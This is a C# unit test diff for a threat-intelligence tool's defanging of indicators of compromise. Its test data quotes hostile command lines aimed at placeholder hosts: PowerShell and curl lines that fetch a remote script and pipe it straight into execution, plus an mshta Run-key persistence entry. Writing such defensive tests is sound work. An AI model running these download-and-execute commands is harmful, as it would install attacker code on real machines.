@@ -86,4 +86,17 @@ public class IocExtractorTests
         IocObservable.Defang(IndicatorType.Domain, "cook.example").Should().Be("cook[.]example");
         IocObservable.Defang(IndicatorType.IpAddress, "203.0.113.45").Should().Be("203.0.113[.]45");
     }
+
+    [Theory]
+    [InlineData(IndicatorType.CommandLine, "powershell -nop -c iwr https://evil.example/a.ps1 | iex", "powershell -nop -c iwr hxxps://evil.example/a.ps1 | iex")]
+    [InlineData(IndicatorType.CommandLine, "curl -s HTTP://203.0.113.9/x.sh|sh", "curl -s hxxp://203.0.113.9/x.sh|sh")]
+    [InlineData(IndicatorType.Other, "beacon to https://c2.example/api", "beacon to hxxps://c2.example/api")]
+    [InlineData(IndicatorType.RegistryKey, @"HKCU\Software\Run\x = mshta http://evil.example/p.hta", @"HKCU\Software\Run\x = mshta hxxp://evil.example/p.hta")]
+    public void Defang_ByType_NeutersAWebAddressInsideAnyIndicator_SoAMailClientCantLinkIt(IndicatorType type, string value, string shown)
+    {
+        // A command line quoting its download URL went into the team email as typed, and Outlook and Gmail made the URL
+        // a live link. The rest is left as typed (a command line's dots aren't an address's).
+        IocObservable.Defang(type, value).Should().Be(shown);
+        IndicatorLabels.Shown(type, value).Should().NotContainEquivalentOf("http://").And.NotContainEquivalentOf("https://");
+    }
 }
